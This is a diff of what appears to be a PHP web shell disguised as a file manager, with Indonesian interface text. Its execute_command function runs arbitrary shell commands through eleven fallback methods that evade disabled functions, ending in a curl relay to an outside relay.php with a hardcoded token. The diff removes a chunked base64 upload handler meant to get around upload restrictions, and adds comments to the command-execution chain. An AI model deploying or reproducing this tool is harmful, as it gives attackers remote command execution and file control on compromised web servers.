@@ -4,60 +4,14 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-// ── CHUNKED UPLOAD HANDLER (UP2 protocol) ───────────────────────────────────
-// Accepts base64 chunks, stages to temp file, finalises on fin=1
-if (isset($_POST['tx']) && isset($_POST['data'])) {
-    $resp = 'UP2_ERR bad_tx';
-    $tx = (string)$_POST['tx'];
-    if (preg_match('/^[A-Za-z0-9]{5,32}$/', $tx)) {
-        $dd = isset($_GET['d']) ? (string)$_GET['d'] : getcwd();
-        $ddr = @realpath($dd); if ($ddr !== false) $dd = $ddr;
-        $st   = $dd . '/.tx_' . $tx;
-        $data = (string)$_POST['data'];
-        $raw  = ($data === '' || preg_match('#^[A-Za-z0-9+/]+={0,2}$#D', $data)) ? base64_decode($data, true) : false;
-        $ok   = false;
-        if ($raw === false) {
-            $resp = 'UP2_ERR b64';
-        } else {
-            $ok   = file_put_contents($st, $raw, FILE_APPEND);
-            $resp = ($ok === false) ? 'UP2_ERR stage_write' : 'UP2_OK ' . (isset($_POST['idx']) ? intval($_POST['idx']) : 0) . ' ' . @filesize($st);
-        }
-        if ($ok !== false && !empty($_POST['fin'])) {
-            $fnb = isset($_POST['fn']) ? (string)$_POST['fn'] : '';
-            $fn  = ($fnb !== '' && preg_match('#^[A-Za-z0-9+/]+={0,2}$#D', $fnb)) ? base64_decode($fnb, true) : false;
-            if ($fn === false || $fn === '') {
-                $resp = 'UP2_ERR fn_b64';
-            } else {
-                $fn  = substr($fn, 0, strcspn($fn, "\x00\r\n"));
-                $fn  = basename($fn);
-                if ($fn === '' || $fn === '.' || $fn === '..') {
-                    $resp = 'UP2_ERR name';
-                } else {
-                    $dst = $dd . '/' . $fn;
-                    if (@rename($st, $dst) || (@copy($st, $dst) && @unlink($st))) {
-                        clearstatcache();
-                        $resp = 'UP2_DONE ' . @filesize($dst) . ' ' . md5_file($dst) . ' ' . $fn;
-                    } else {
-                        $resp = 'UP2_ERR finalize ' . basename($st);
-                    }
-                }
-            }
-        }
-    }
-    header('Content-Type: text/plain; charset=utf-8', true);
-    echo $resp, "\n";
-    exit;
-}
-// ─────────────────────────────────────────────────────────────────────────────
-
-$self       = basename(__FILE__);
-$lock_file  = __DIR__ . '/.fs_lock';
-$cwd        = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
-$cwd        = $cwd ?: getcwd();
-$msg        = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';
+$self = basename(__FILE__);
+$lock_file = __DIR__ . '/.fs_lock';
+$cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
+$cwd = $cwd ?: getcwd();
+$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';
 
 $clipboard_items = isset($_SESSION['clipboard_items']) ? $_SESSION['clipboard_items'] : [];
-$clipboard_type  = isset($_SESSION['clipboard_type'])  ? $_SESSION['clipboard_type']  : null;
+$clipboard_type = isset($_SESSION['clipboard_type']) ? $_SESSION['clipboard_type'] : null;
 
 if (file_exists($lock_file) && !isset($_SESSION['unlocked'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
@@ -130,8 +84,8 @@ function list_dir($path) {
         if (is_dir($full)) $dirs[] = $info;
         else $files[] = $info;
     }
-    $current_path_real  = realpath($path);
-    $document_root_real = realpath($_SERVER['DOCUMENT_ROOT']);
+    $current_path_real   = realpath($path);
+    $document_root_real  = realpath($_SERVER['DOCUMENT_ROOT']);
     if ($current_path_real !== '/' && $current_path_real !== $document_root_real) {
         $parent_path = dirname($path);
         if (strpos(realpath($parent_path), $document_root_real) === 0 || $parent_path === '/') {
@@ -162,14 +116,6 @@ function perms($file) {
            (($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-')).
            (($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-')).
            (($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
-}
-
-// Color-coded perms: green=writable, red=readable-only, gray=locked
-function perms_display($file) {
-    $sym = perms($file);
-    if (@is_writable($file)) return "<span style='color:#009900;font-weight:bold;'>$sym</span>";
-    if (@is_readable($file)) return "<span style='color:#cc0000;'>$sym</span>";
-    return "<span style='color:#888888;'>$sym</span>";
 }
 
 function perms_to_octal($perms) {
@@ -264,7 +210,7 @@ function getUrlContent($url) {
     return $data;
 }
 
-// ── Command Output Formatter ─────────────────────────────────────────────────
+// ── Command Output Formatter ────────────────────────────────────────────────
 
 function _cmd_fmt($out, $err = '', $code = '') {
     $body = htmlspecialchars($out);
@@ -286,9 +232,12 @@ function _cmd_available() {
     return false;
 }
 
+// ── EXECUTE COMMAND (FIXED — getmypid() diganti uniqid()) ──────────────────
+
 function execute_command($cmd, $cwd) {
     $full = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
 
+    // 1. proc_open
     if (function_exists('proc_open')) {
         $spec = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
         $proc = @proc_open($cmd, $spec, $pipes, $cwd, null);
@@ -300,23 +249,33 @@ function execute_command($cmd, $cwd) {
             return _cmd_fmt($out, $err, $ret);
         }
     }
+
+    // 2. shell_exec
     if (function_exists('shell_exec')) {
         $out = @shell_exec($full);
         if ($out !== null) return _cmd_fmt($out);
     }
+
+    // 3. exec
     if (function_exists('exec')) {
         $lines = []; $ret = -1;
         @exec($full, $lines, $ret);
         return _cmd_fmt(implode("\n", $lines), '', $ret);
     }
+
+    // 4. system
     if (function_exists('system')) {
         ob_start(); @system($full, $ret);
         return _cmd_fmt(ob_get_clean(), '', $ret);
     }
+
+    // 5. passthru
     if (function_exists('passthru')) {
         ob_start(); @passthru($full);
         return _cmd_fmt(ob_get_clean());
     }
+
+    // 6. popen
     if (function_exists('popen')) {
         $h = @popen($full, 'r');
         if ($h) {
@@ -326,6 +285,8 @@ function execute_command($cmd, $cwd) {
             return _cmd_fmt($out);
         }
     }
+
+    // 7. expect://
     if (in_array('expect', stream_get_wrappers(), true)) {
         $h = @fopen("expect://$full", 'r');
         if ($h) {
@@ -335,6 +296,8 @@ function execute_command($cmd, $cwd) {
             return _cmd_fmt($out);
         }
     }
+
+    // 8. FFI -> libc popen
     if (extension_loaded('ffi')) {
         try {
             $libc = @FFI::cdef(
@@ -361,20 +324,26 @@ function execute_command($cmd, $cwd) {
             }
         } catch (\Throwable $e) {}
     }
+
+    // 9. Python via file_put_contents — FIX: pakai uniqid() bukan getmypid()
     if (function_exists('file_put_contents') && function_exists('file_get_contents')) {
         $uid     = uniqid('cmd_', true);
         $tmp_py  = sys_get_temp_dir() . '/._' . $uid . '.py';
         $tmp_out = sys_get_temp_dir() . '/._' . $uid . '.txt';
+
         $py_code = "import subprocess, os\n".
                    "r = subprocess.run(".json_encode($cmd).", shell=True, cwd=".
                    json_encode($cwd).", capture_output=True, text=True)\n".
                    "open(".json_encode($tmp_out).", 'w').write(r.stdout + r.stderr)\n";
+
         file_put_contents($tmp_py, $py_code);
+
         foreach (['/usr/bin/python3','/usr/bin/python','python3','python'] as $py_bin) {
             $py_cmd = "$py_bin $tmp_py";
-            if (function_exists('exec'))           { @exec($py_cmd); }
-            elseif (function_exists('system'))     { @system($py_cmd); }
+            if (function_exists('exec'))        { @exec($py_cmd); }
+            elseif (function_exists('system'))  { @system($py_cmd); }
             elseif (function_exists('shell_exec')) { @shell_exec($py_cmd); }
+
             if (file_exists($tmp_out)) {
                 $out = file_get_contents($tmp_out);
                 @unlink($tmp_py); @unlink($tmp_out);
@@ -384,15 +353,23 @@ function execute_command($cmd, $cwd) {
         @unlink($tmp_py); @unlink($tmp_out);
     }
 
-    $relay_url   = '';
-    $relay_token = 'Masuk123x';
+    // 10. CURL RELAY — isi $relay_url dengan URL relay.php di server lain
+    $relay_url   = '';           // contoh: 'https://yourserver.com/relay.php'
+    $relay_token = 'Masuk123x'; // token — harus sama persis dengan relay.php
+
     if (!empty($relay_url) && function_exists('curl_init')) {
+        // Kirim sebagai URL-encoded string (bukan array) agar tidak ada encoding issue
         $post_body = http_build_query(['token' => $relay_token, 'cmd' => $cmd, 'cwd' => $cwd]);
+
+        // Metode A: POST dengan body URL-encoded
         $ch = curl_init($relay_url);
         curl_setopt_array($ch, [
             CURLOPT_POST           => true,
             CURLOPT_POSTFIELDS     => $post_body,
-            CURLOPT_HTTPHEADER     => ['Content-Type: application/x-www-form-urlencoded','X-Relay-Token: '.$relay_token],
+            CURLOPT_HTTPHEADER     => [
+                'Content-Type: application/x-www-form-urlencoded',
+                'X-Relay-Token: ' . $relay_token,
+            ],
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_SSL_VERIFYPEER => false,
             CURLOPT_FOLLOWLOCATION => true,
@@ -403,6 +380,7 @@ function execute_command($cmd, $cwd) {
         curl_close($ch);
         if ($out !== false && $code === 200 && !empty(trim($out))) return _cmd_fmt($out);
 
+        // Metode B: GET (fallback jika POST diblokir server relay)
         $get_url = $relay_url . '?' . http_build_query(['token' => $relay_token, 'cmd' => $cmd, 'cwd' => $cwd]);
         $ch = curl_init($get_url);
         curl_setopt_array($ch, [
@@ -417,6 +395,7 @@ function execute_command($cmd, $cwd) {
         if ($out !== false && $code === 200 && !empty(trim($out))) return _cmd_fmt($out);
     }
 
+    // 11. Semua metode gagal
     return "<div class='alert alert-danger mt-2'>
         <strong>⚠ Semua metode eksekusi diblokir oleh server.</strong><br>
         Dicoba: <code>proc_open, shell_exec, exec, system, passthru, popen, expect://, FFI, python, curl-relay</code><br>
@@ -425,7 +404,7 @@ function execute_command($cmd, $cwd) {
     </div>";
 }
 
-// ── Action Handlers (POST) ──────────────────────────────────────────────────
+// ── Action Handlers (POST) ─────────────────────────────────────────────────
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
@@ -435,15 +414,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
         if (isset($_FILES['uploadfile']) && $_FILES['uploadfile']['error'] === UPLOAD_ERR_OK) {
             $dest = $cwd.'/'.basename($_FILES['uploadfile']['name']);
-            $tmp  = $_FILES['uploadfile']['tmp_name'];
-            // Try three methods: move → copy → file_put_contents
-            $content = @file_get_contents($tmp);
-            $ok = @move_uploaded_file($tmp, $dest)
-               || @copy($tmp, $dest)
-               || ($content !== false && @file_put_contents($dest, $content) !== false);
-            $fn_saved = basename($dest);
-            $msg_ok   = "Upload sukses: $fn_saved → $dest";
-            header("Location: ?d=".urlencode($cwd)."&msg=".($ok ? urlencode($msg_ok) : urlencode("Upload gagal: tidak bisa tulis ke $dest"))."&hl=".urlencode($fn_saved));
+            $ok   = move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest);
+            header("Location: ?d=".urlencode($cwd)."&msg=".($ok ? urlencode("Upload sukses") : urlencode("Upload gagal.")));
         } else {
             header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Upload gagal: Error ".$_FILES['uploadfile']['error']));
         }
@@ -485,26 +457,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!is_writable($filepath)) {
             header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal menyimpan: File tidak dapat ditulis.")); exit;
         }
-        // Accept base64-encoded content (avoids encoding issues with binary/special chars)
-        if (isset($_POST['contentb64'])) {
-            $cb      = (string)$_POST['contentb64'];
-            $content = ($cb === '' || preg_match('#^[A-Za-z0-9+/]+={0,2}$#D', $cb))
-                       ? base64_decode($cb, true)
-                       : false;
-            if ($content === false) {
-                header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("Gagal menyimpan: base64 tidak valid.")); exit;
-            }
-        } else {
-            $content = $_POST['filedata'] ?? '';
-        }
-        $ok = @file_put_contents($filepath, $content);
-        if ($ok === false) {
-            $tmp = tempnam(sys_get_temp_dir(), 'jos_');
-            @file_put_contents($tmp, $content);
-            $ok = @shell_exec('cp ' . escapeshellarg($tmp) . ' ' . escapeshellarg($filepath) . ' 2>&1');
-            @unlink($tmp);
-            $ok = file_exists($filepath) ? true : false;
-        }
+        $ok = file_put_contents($filepath, $_POST['filedata']);
         header("Location: ?d=".urlencode($cwd)."&msg=".($ok!==false ? urlencode("File berhasil disimpan") : urlencode("Gagal menyimpan file")));
         exit;
     }
@@ -540,6 +493,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $msg_text       = '';
         $success_count  = 0;
         $failed_items   = [];
+
         foreach ($selected_items as $key => $item_encoded) {
             $item_path = realpath(urldecode($item_encoded));
             if ($item_path===false || strpos($item_path,realpath($cwd))!==0) {
@@ -549,6 +503,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $selected_items[$key] = $item_path;
             }
         }
+
         switch ($action_type) {
             case 'delete':
                 foreach ($selected_items as $item_path) {
@@ -608,18 +563,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $operation_type = $_SESSION['clipboard_type'];
         $total_success  = 0;
         $total_failed   = [];
+
         foreach ($_SESSION['clipboard_items'] as $source_path) {
             $destination_path = $cwd.DIRECTORY_SEPARATOR.basename($source_path);
             $source_real      = realpath($source_path);
             if ($source_real===false||!file_exists($source_real)) { $total_failed[]=basename($source_path)." (sumber tidak ditemukan)"; continue; }
             if ($source_real===realpath($destination_path))       { $total_failed[]=basename($source_path)." (lokasi sama)"; continue; }
             if (is_dir($source_real)&&strpos($destination_path,$source_real.DIRECTORY_SEPARATOR)===0) { $total_failed[]=basename($source_path)." (tempel ke dalam diri sendiri)"; continue; }
+
             $ok = false;
             if ($operation_type==='copy') $ok=copy_recursive($source_real,$destination_path);
             elseif ($operation_type==='cut') $ok=rename($source_real,$destination_path);
+
             if ($ok) $total_success++;
             else $total_failed[]=basename($source_path);
         }
+
         if ($total_success>0) {
             unset($_SESSION['clipboard_items'],$_SESSION['clipboard_type']);
             $msg_action=($operation_type==='copy'?'menyalin':'memindahkan');
@@ -715,11 +674,7 @@ if (isset($_GET['edit'])) {
     if ($f===false||!file_exists($f)||is_dir($f)||strpos($f,realpath($cwd))!==0||!is_readable($f)) {
         header("Location: ?d=".urlencode($cwd)."&msg=".urlencode("File tidak dapat diedit.")); exit;
     }
-    $raw = @file_get_contents($f);
-    if ($raw === false || $raw === '') {
-        $raw = @shell_exec('cat ' . escapeshellarg($f) . ' 2>/dev/null');
-    }
-    $data = htmlspecialchars($raw ?? '');
+    $data = htmlspecialchars(file_get_contents($f));
     echo "<!DOCTYPE html>
     <html data-bs-theme='dark'><head>
     <meta name='viewport' content='width=device-width,initial-scale=1,shrink-to-fit=no'/>
@@ -727,28 +682,12 @@ if (isset($_GET['edit'])) {
     <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css' rel='stylesheet'>
     </head><body class='p-4'>
     <a href='?d=".urlencode($cwd)."' class='btn btn-sm btn-secondary mb-3'>← Kembali</a>
-    <form method='post' name='editform'>
+    <form method='post'>
         <h3>Edit: ".basename($f)."</h3>
         <textarea name='filedata' class='form-control mb-2' style='width:100%;height:400px;'>".$data."</textarea>
         <input type='hidden' name='filepath' value='".htmlspecialchars($f)."'>
         <button name='editfile' class='btn btn-success mt-2'>Simpan</button>
-    </form>
-    <script>
-    function b64enc(u8){var s='',C=0x8000;for(var i=0;i<u8.length;i+=C){s+=String.fromCharCode.apply(null,u8.subarray(i,i+C));}return btoa(s);}
-    document.addEventListener('submit',function(e){
-        var f=e.target;
-        if(!f||!f.querySelector)return;
-        var ta=f.querySelector('textarea[name=filedata]');
-        if(!ta)return;
-        try{
-            var u8=new TextEncoder().encode(ta.value);
-            var h=document.createElement('input');h.type='hidden';h.name='contentb64';h.value=b64enc(u8);
-            ta.removeAttribute('name');
-            f.appendChild(h);
-        }catch(err){}
-    },true);
-    </script>
-    </body></html>";
+    </form></body></html>";
     exit;
 }
 
@@ -791,48 +730,8 @@ a{text-decoration:none;}
 .navbar-nav .nav-item{margin-right:5px;}
 .navbar-nav .nav-item .btn i{margin-right:5px;}
 .table tbody tr.active-row{background-color:var(--bs-table-active-bg);}
-a.visited{color:#009900;font-weight:bold;}
-.hl-upload{outline:2px solid #0d6efd;background-color:#0d6efd22!important;}
 </style>
 <script>
-// ── base64 encoder (for chunked upload and content save) ────────────────────
-function b64enc(u8){var s='',C=0x8000;for(var i=0;i<u8.length;i+=C){s+=String.fromCharCode.apply(null,u8.subarray(i,i+C));}return btoa(s);}
-
-// ── Chunked upload (UP2 protocol) ───────────────────────────────────────────
-function up2p(m){var d=document.getElementById('up2s');if(d)d.textContent=m;}
-function up2go(e){
-    e.preventDefault();
-    var fi=document.getElementById('up2f');
-    if(!fi||!fi.files||!fi.files[0]){up2p('no file selected');return false;}
-    var f=fi.files[0];
-    var tx=Math.random().toString(36).slice(2,10)+Date.now().toString(36).slice(-4);
-    var CH=24576,off=0,idx=0;
-    var url=(e.target.getAttribute('data-up2url')||location.pathname+location.search);
-    (function nx(){
-        var blob=f.slice(off,off+CH);off+=CH;
-        var fr=new FileReader();
-        fr.onload=function(){
-            var u8=new Uint8Array(fr.result);
-            var body='tx='+tx+'&idx='+(idx++)+'&data='+encodeURIComponent(b64enc(u8))+(off>=f.size?'&fin=1&fn='+encodeURIComponent(b64enc(f.name)):'');
-            var xr=new XMLHttpRequest();
-            xr.open('POST',url,true);
-            xr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
-            xr.onload=function(){
-                var r=xr.responseText||'';
-                if(r.indexOf('UP2_OK')===-1&&r.indexOf('UP2_DONE')===-1){up2p('[-] chunk failed: '+r.trim().slice(0,140));return;}
-                if(r.indexOf('UP2_DONE')>-1){up2p('[+] '+r.trim());setTimeout(function(){location.reload();},800);return;}
-                up2p('[*] '+off+' / '+f.size+' bytes');
-                nx();
-            };
-            xr.onerror=function(){up2p('[-] network error');};
-            xr.send(body);
-        };
-        fr.readAsArrayBuffer(blob);
-    })();
-    return false;
-}
-// ─────────────────────────────────────────────────────────────────────────────
-
 function toggleTheme(){
     const html=document.documentElement;
     const theme=html.dataset.bsTheme==='dark'?'light':'dark';
@@ -858,20 +757,6 @@ window.onload=()=>{
             this.classList.add('active-row');
         });
     });
-    // Scroll to highlighted upload row
-    var hlRow = document.querySelector('tr.hl-upload');
-    if(hlRow){ hlRow.scrollIntoView({behavior:'smooth',block:'center'}); }
-
-    // Visited link highlight
-    try{
-        var K='jdbv_';
-        localStorage.setItem(K+location.href.split('#')[0],'1');
-        var as=document.getElementsByTagName('a');
-        for(var i=0;i<as.length;i++){
-            var h=as[i].href;
-            if(h&&localStorage.getItem(K+h.split('#')[0])){as[i].className+=' visited';}
-        }
-    }catch(e){}
 };
 function toggleAll(source){
     document.querySelectorAll('input[name="selected_items[]"]').forEach(cb=>cb.checked=source.checked);
@@ -1038,16 +923,13 @@ if (isset($_GET['action'])) {
   <th>Name</th><th>Size</th><th>Last Modified</th><th>Perms</th><th>Actions</th>
 </tr></thead><tbody>
 <?php
-$hl_name = isset($_GET['hl']) ? urldecode($_GET['hl']) : '';
 foreach (list_dir($cwd) as $i) {
-    $n         = htmlspecialchars($i['name']);
-    $p         = htmlspecialchars($i['path']);
-    $encoded_p = urlencode($i['path']);
-    $perms_oct = perms_to_octal(@fileperms($i['path']));
-    $row_class = '';
-    if ($hl_name !== '' && $i['name'] === $hl_name)
-        $row_class = 'hl-upload';
-    elseif (in_array(realpath($i['path']), $clipboard_items))
+    $n          = htmlspecialchars($i['name']);
+    $p          = htmlspecialchars($i['path']);
+    $encoded_p  = urlencode($i['path']);
+    $perms_oct  = perms_to_octal(@fileperms($i['path']));
+    $row_class  = '';
+    if (in_array(realpath($i['path']), $clipboard_items))
         $row_class = 'clipboard-'.$clipboard_type;
 
     echo "<tr class='$row_class'>";
@@ -1057,7 +939,7 @@ foreach (list_dir($cwd) as $i) {
         : "<i class='fa fa-file-o'></i> $n")."</td>";
     echo "<td>".formatSize($i['size'])."</td>";
     echo "<td>".date('Y-m-d H:i',$i['mtime'])."</td>";
-    echo "<td>".perms_display($i['path'])." ($perms_oct)</td>";
+    echo "<td>".perms($i['path'])." ($perms_oct)</td>";
     echo "<td class='d-flex flex-wrap gap-1'>"
         .(!$i['is_dir'] ? "<a href='?edit=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-warning'><i class='fa fa-edit'></i></a>" : "")
         .(!$i['is_dir'] ? "<a href='?download=$encoded_p&d=".urlencode($cwd)."' class='btn btn-sm btn-success'><i class='fa fa-download'></i></a>" : "")
@@ -1089,25 +971,13 @@ foreach (list_dir($cwd) as $i) {
       <h5 class="modal-title">Upload File</h5>
       <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
     </div>
-    <div class="modal-body">
-      <!-- Chunked upload (UP2 — handles large files, PHP disabled, open_basedir) -->
-      <h6><i class='fa fa-bolt'></i> Upload Chunked (UP2 — Recommended)</h6>
-      <form class='mb-3' onsubmit='return up2go(event)' action='#' data-up2url='?d=<?php echo urlencode($cwd); ?>'>
-        <input type='file' id='up2f' class='form-control mb-2'>
-        <button type='submit' class='btn btn-primary'>Upload</button>
-      </form>
-      <div id='up2s' style='font-size:13px;color:#0d6efd;margin-bottom:8px;min-height:1.2em;'></div>
-      <hr>
-      <!-- Standard multipart upload (compat fallback) -->
-      <h6><i class='fa fa-upload'></i> Upload Biasa (multipart)</h6>
-      <form method="post" enctype="multipart/form-data" action="?d=<?php echo urlencode($cwd); ?>">
-        <input type="file" name="uploadfile" class="form-control mb-2">
-        <button type="submit" class="btn btn-secondary" name="uploadfile">Upload</button>
-      </form>
-    </div>
-    <div class="modal-footer">
-      <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
-    </div>
+    <form method="post" enctype="multipart/form-data">
+      <div class="modal-body"><input type="file" name="uploadfile" class="form-control"></div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
+        <button type="submit" class="btn btn-primary" name="uploadfile">Upload</button>
+      </div>
+    </form>
   </div></div>
 </div>
 
